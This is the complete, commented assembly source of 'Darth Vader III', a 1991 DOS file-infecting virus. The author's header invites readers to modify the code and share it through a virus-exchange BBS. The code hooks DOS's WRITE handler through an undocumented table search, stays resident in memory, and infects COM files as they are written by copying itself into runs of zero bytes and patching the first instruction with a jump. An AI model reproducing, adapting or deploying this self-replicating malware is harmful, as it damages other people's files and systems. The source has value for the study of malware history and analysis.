;*******************************************************************************
;*									       *
;*			      D A R T H   V A D E R   ]I[		       *
;*									       *
;*	(C) - Copyright 1991 by Waleri Todorov, CICTT-Sofia		       *
;*	All Rights Reserved						       *
;*									       *
;*	This is the third release of Darth Vader virus. He also infect only    *
;*	those COM file, wich have area of 255 (or more) zeros. As you might    *
;*	see, virus' size is reduced. This increase possibility file to have    *
;*	enough	zeros  to  hold  virus.  In  several tests the percentage of   *
;*	infected file was tested, and it was bigger than in Darth Vader 2.     *
;*	This release support only DOS 2.X and later, but less than 5.X	       *
;*	    You may make any modifications in this source, BUT let me know     *
;*	what you have done (drop me a message at Virus eXchange BBS)	       *
;*									       *
;*						  Waleri Todorov	       *
;*******************************************************************************


		org	0	; Begin from offset 0

		nop		; Dummy NOPs. Don't remove them
		nop
		nop

		call	NextLine	; Call next instruction
NextLine
		pop	bx		; To calculate it's own location
		sub	bx,6		; Location stored in BX
		mov	[0FEh],ax	; Save AX for further usage

		xor	ax,ax		; Set DS to point in interrupt table
		mov	ds,ax		;
		les	ax,[2Bh*4]	; ES:AX point to vector 2B; ES==DOSSEG
		xor	di,di		; ES:DI point to DOSSEG:0000
		mov	cx,1000h	; Will search 1000h bytes
		call	SearchZero	; Search Zeros in ES:DI
		jc	ReturnControl	; If CF==Yes -> no place and exit
		mov	cs:[bx+offset NewStart],di	; Save beginnig

		xor	si,si		; SI=0;
		push	es		; Set DS point to DOSSEG
		pop	ds
SearchTable
		lodsw			; Load word from DS:SI
		cmp	ax,8B2Eh	; Check first 'magic' byte
		je	Found1		; If match -> check next byte
NotHere
		dec	si		; Else go search from next byte
		jmp	short SearchTable
Found1
		lodsb			; Load next byte
		cmp	al,9Fh		; If match with last 'magic' byte
		je	FoundTable	; fo to found table
		dec	si		; else go search from next byte
		jmp	short NotHere
FoundTable
		lodsw			; Load table address to AX
		xchg	ax,bx		; Exchange AX <-> BX
		mov	cx,[bx+80h]	; Load in CX old WRITE handler offset
		xchg	ax,bx		; Exchange AX <-> BX
		mov	cs:[bx+offset OldWrite],cx	; Save old offset
		lea	cx,[di+offset Handle]	; Load in CX new offset
		xchg	ax,bx		; Exchgange AX <-> BX
		mov	[bx+80h],cx	; Store new WRITE offset to table
		xchg	ax,bx		; Exchange AX <-> BX

		push	cs		; Set DS point to virus code
		pop	ds		;
		mov	cx,offset LastByte	; CX = Virus Size
		mov	si,bx		; SI=virus start offset
		rep	movsb		; ES:DI point to free area in DOS
					; go in there
ReturnControl
		push	cs		; Set DS & ES point in host program
		push	cs
		pop	ds
		pop	es
		mov	di,100h 	; DI point CS:100
		lea	si,[bx+offset First3]	; SI point old first instr
		push	di		; Save DI for dummy RETurn
		movsw		; Move first 2 byte
		movsb		; Move another one
		mov	ax,[0FEh]	; Restore AX (Remember?)
		xor	bx,bx		; Clear BX
		ret		; Return control to host via dummy RETurn

; Here terminate virus installation in memory. After this moment
; virus is active and will infect any COM file bigger than the virus
; and having enough zeros


SearchZero
		xor	ax,ax	; Set AX to zero (gonna search zeros)
Again
		inc	di	; ES:DI++
		push	cx	; Save CX
		push	di	; Save DI
		mov	cx,offset LastByte	; CX = Virus Size
		repe	scasb	; Search until equal
		pop	di	; Restore DI
		jcxz	FoundPlace	; If CX==0 then ES:DI point to zeros
		pop	cx	; Else restore CX
		loop	Again	; And loop again until CX!=0
		stc		; If CX==0
		ret		; Set CF and return to caller (No place)
FoundPlace
		pop	cx	; Restore CX
		clc		; Clear CF (ES:DI point to zero area)
		ret		; Return to caller

; The followed procedure is new WRITE handle. It check does write buffer
; have enough zeros to hold virus. If so -> copy virus in zero area, change
; entry point and write file, else write file only

Handle
		mov	ss:[4],bp	; Save BP (BP used as index register)
		push	es		; Save important registers
		push	ax		; DS:DX are saved last, because
		push	bx		; they are used later in infection
		push	cx
		push	si
		push	di
		push	ds		;
		push	dx		;

		call	NextHandle	; Call NextHandle to calculate
OldWrite				; variable area offset
		dw	0		; Old WRITE handler
NewStart
		dw	0		; Virus offset in DOSSEG
First3
		int	20h		; First 3 instruction of COM file
		nop

NextHandle
		pop	bp		; Set SS:BP to point to variable area

		cmp	cx,offset LastByte+10h	; Check if write buffer
		jb	Do		; is big enough. If not -> exit

		mov	ax,1220h	; Get file handle (BX) table number
		int	2Fh		; Via interrupt 2F (undocumented)
		mov	bl,es:[di]	; Load handle table number in BL
		mov	ax,1216h	; Get file handle table address
		int	2Fh		; Via interrupt 2F (undocumented)
		cmp	es:[di+29h],'MO'        ; Check if file is ?OM
		jne	Do		; If not -> exit

		pop	di	; Set ES:DI to point write buffer
		pop	es	;
		push	es	;
		push	di	;
		mov	ax,es:[di]	; Set AX to first 2 bytes from buffer
		mov	[bp+4],ax	; and save it in First instruction
		mov	al,es:[di+2]	; Set AL to third byte from buffer
		mov	[bp+6],al	; and save it in First instruction

		call	SearchZero	; Search zeros area in buffer
		jc	Do		; If not found -> exit

		mov	bx,di		; Set BX to point zero area

		push	cs		; Set DS point to DOSSEG (Virus)
		pop	ds
		mov	si,[bp+2]	; Set SI to virus offset in DOSSEG
		mov	cx,offset LastByte	; Set CX to virus size
		rep	movsb		; Move virus to buffer
		pop	di		; Set DI point to buffer (not zero area)
		push	di
		mov	al,0E9h 	; Set AL to JMP opcode
		sub	bx,di		; Set BX to virus offset in file
		stosb			; Store JMP to buffer
		xchg	ax,bx		; AX now have offset of virus in file
		sub	ax,3		; Calculate JMP argument
		stosw			; and store it in buffer

Do
		pop	dx		; Restore important registers
		pop	ds
		pop	di
		pop	si
		pop	cx
		pop	bx
		pop	ax
		pop	es

		push	[bp]		; Put old WRITE offset in stack for RET
		mov	bp,ss:[4]	; Restore BP

		ret			; Call DOS via dummy RETurn

		db	'Darth Vader '  ; Virus sign

LastByte	label	byte		; Last byte of virus
